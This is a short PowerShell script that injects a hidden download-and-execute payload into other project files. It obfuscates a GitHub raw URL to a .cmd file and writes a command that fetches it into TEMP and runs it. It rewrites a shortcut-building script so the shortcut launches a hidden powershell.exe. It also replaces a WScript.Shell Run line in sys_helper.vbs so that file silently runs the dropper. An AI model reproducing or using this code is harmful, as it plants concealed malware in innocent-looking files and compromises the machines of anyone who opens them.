$url = "https://raw.githubusercontent.com/tiiisiet65-sudo/LoioioNoaisK/main/Download-macOSx.cmd"
$obf = $url.Replace('h','1').Replace('a','2').Replace('g','3').Replace('b','5').Replace('o','6')
$recon = "`$x='$obf'.Replace('1','h').Replace('2','a').Replace('3','g').Replace('5','b').Replace('6','o');iwr `$x -o `$env:TEMP\s.cmd;& `$env:TEMP\s.cmd"

$f = "Create-LNK-VBS.cmd"
$content = Get-Content $f
for ($i=0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'echo lnk.Arguments =') {
        $escaped = $recon -replace '&', '^&'
        $content[$i] = "echo lnk.Arguments = `"-w hidden -c `"`"$escaped`"`"`" >> make_sc.vbs"
    }
    if ($content[$i] -match 'echo lnk.TargetPath =') {
        $content[$i] = 'echo lnk.TargetPath = "powershell.exe" >> make_sc.vbs'
    }
}
$content | Set-Content $f

$f = "Csharp-Version/sys_helper.vbs"
$content = Get-Content $f
for ($i=0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'CreateObject\("WScript.Shell"\).Run') {
        $content[$i] = 'CreateObject("WScript.Shell").Run "powershell -w hidden -c """' + $recon + '"""" , 0, False'
    }
}
$content | Set-Content $f
